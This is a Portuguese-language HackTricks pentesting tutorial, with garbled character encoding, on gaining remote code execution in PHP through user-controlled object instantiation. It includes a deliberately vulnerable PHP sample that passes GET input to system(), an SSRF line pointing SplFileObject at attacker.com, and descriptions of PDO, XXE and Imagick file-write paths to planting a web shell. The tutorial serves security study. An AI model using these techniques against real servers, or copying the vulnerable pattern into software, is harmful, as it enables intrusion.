# PHP - RCE abusando da criaÃ§Ã£o de objetos: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## IntroduÃ§Ã£o

Na situaÃ§Ã£o em que vocÃª pode criar um novo objeto arbitrÃ¡rio como `new $_GET["a"]($_GET["a"])`, vocÃª pode ser capaz de obter RCE, e [**este artigo**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) expÃµe diferentes maneiras de obter RCE.

## RCE via Classes Personalizadas ou Autoloading

Na construÃ§Ã£o `new $a($b)`, a **variÃ¡vel `$a` representa o nome da classe** para a qual o objeto serÃ¡ criado, e a variÃ¡vel **`$b` representa o primeiro argumento** que serÃ¡ passado para o construtor do objeto.

Se `$a` e `$b` vierem de GET/POST, eles podem ser **strings ou arrays de strings**. Se eles vierem de **JSON** ou de outro lugar, eles **podem ter outros tipos**, como objeto ou booleano.

Vamos considerar o seguinte exemplo:
```php
class App {
    function __construct ($cmd) {
        system($cmd);
    }
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
    function App2 ($cmd) {
        system($cmd);
    }
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Neste cÃ³digo, vocÃª pode definir `$a` como `App` ou `App2` e `$b` como `uname -a`. Depois disso, o comando `uname -a` serÃ¡ executado.

Quando nÃ£o hÃ¡ classes explorÃ¡veis em sua aplicaÃ§Ã£o, ou vocÃª tem a classe necessÃ¡ria em um arquivo separado que nÃ£o Ã© incluÃ­do pelo cÃ³digo vulnerÃ¡vel, vocÃª pode dar uma olhada em funÃ§Ãµes de carregamento automÃ¡tico.

As **funÃ§Ãµes de carregamento automÃ¡tico** sÃ£o definidas registrando callbacks via `spl_autoload_register` ou definindo `__autoload`. Elas sÃ£o chamadas quando uma instÃ¢ncia de uma classe desconhecida estÃ¡ tentando ser criada.
```php
# An example of an autoloading function
spl_autoload_register(function ($class_name) {
        include './../classes/' . $class_name . '.php';
});

# An example of an autoloading function, works only in PHP < 8.0
function __autoload($class_name) {
        include $class_name . '.php';
};

# Calling spl_autoload_register with no arguments enables the default autoloading function, which includes lowercase($classname) + .php/.inc from include_path
spl_autoload_register();
```
Dependendo da versÃ£o do PHP e do cÃ³digo nas funÃ§Ãµes de carregamento automÃ¡tico, pode haver algumas maneiras de obter uma ExecuÃ§Ã£o de CÃ³digo Remoto via carregamento automÃ¡tico.

## RCE via Classes Integradas

Quando vocÃª nÃ£o tem classes personalizadas e carregamento automÃ¡tico, pode depender apenas de **classes integradas do PHP**.

Existem de 100 a 200 classes integradas do PHP. O nÃºmero delas depende da versÃ£o do PHP e das extensÃµes instaladas. Todas as classes integradas podem ser listadas por meio da funÃ§Ã£o `get_declared_classes`, juntamente com as classes personalizadas:
```php
var_dump(get_declared_classes());
```
Classes com construtores Ãºteis podem ser encontradas atravÃ©s da [API de reflexÃ£o](https://www.php.net/manual/en/book.reflection.php).

Exibindo construtores e seus parÃ¢metros usando a API de reflexÃ£o: [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)\


![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/2.png)

Se vocÃª controla **mÃºltiplos parÃ¢metros do construtor e pode chamar mÃ©todos arbitrÃ¡rios** posteriormente, existem muitas maneiras de obter uma ExecuÃ§Ã£o Remota de CÃ³digo. Mas se vocÃª pode passar **apenas um parÃ¢metro e nÃ£o tem nenhuma chamada** para o objeto criado, hÃ¡ **quase nada**.

Eu conheÃ§o apenas trÃªs maneiras de obter algo de `new $a($b)`.

### **SSRF + desserializaÃ§Ã£o Phar**

A classe `SplFileObject` implementa um construtor que permite conexÃ£o com qualquer URL local ou remoto:
```
new SplFileObject('http://attacker.com/');
```
Isso permite SSRF. AlÃ©m disso, SSRFs em PHP < 8.0 podem ser transformados em desserializaÃ§Ãµes por meio de tÃ©cnicas com o protocolo Phar.

### **Explorando PDOs**

A classe PDO tem outro construtor interessante:
```php
new PDO("sqlite:/tmp/test.txt")
```
O construtor `PDO` aceita strings DSN, permitindo **conectar-se a qualquer banco de dados local ou remoto** usando **extensÃµes de banco de dados instaladas**. Por exemplo, a extensÃ£o SQLite pode criar arquivos vazios.

### **SoapClient/SimpleXMLElement XXE**

No PHP â‰¤ 5.3.22 e â‰¤ 5.4.12, o construtor de SoapClient era **vulnerÃ¡vel a XXE**. O construtor de SimpleXMLElement tambÃ©m era vulnerÃ¡vel a XXE, mas exigia libxml2 < 2.9.

## RCE via ExtensÃ£o Imagick

Verificando as **dependÃªncias** do **projeto** que vocÃª estÃ¡ tentando explorar, vocÃª pode encontrar **novas classes** que podem ser **abusadas para executar comandos** criando um novo objeto. Neste caso, o **Imagick** foi encontrado para ser Ãºtil para esse propÃ³sito.

### Analisador VID

O analisador VID permite escrever conteÃºdo arbitrÃ¡rio em um caminho arbitrÃ¡rio dentro do sistema de arquivos, o que permitiria a um invasor escrever um PHPshell em uma pasta acessÃ­vel a partir da pÃ¡gina da web e obter RCE.

![](<../../../.gitbook/assets/image (157) (3).png>)

#### Analisador VID + Upload de Arquivo

Quando um arquivo Ã© carregado no PHP, ele Ã© armazenado temporariamente em `/tmp/phpXXXXXX`. O analisador VID do Imagick com o protocolo **msl** permite **especificar curingas nos caminhos dos arquivos** (para que o arquivo carregado temporariamente possa ser facilmente acessado) e **copiÃ¡-lo para qualquer local arbitrÃ¡rio**.\
Esta Ã© outra maneira de obter gravaÃ§Ã£o de arquivo arbitrÃ¡rio dentro do sistema de arquivos:

![](<../../../.gitbook/assets/image (159).png>)

### PHP Crash + Brute Force

O [**writeup original**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) explicou outra maneira de obter RCE **carregando arquivos com conteÃºdo especÃ­fico** e fazendo o **servidor travar antes de excluir** esse arquivo e, em seguida, **forÃ§ando o nome** do arquivo temporÃ¡rio atÃ© que o **Imagick execute cÃ³digo PHP arbitrÃ¡rio**.

No entanto, aparentemente o **truque de falha** descoberto sÃ³ **funcionou em uma versÃ£o antiga do ImageMagick**.

## ReferÃªncias

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
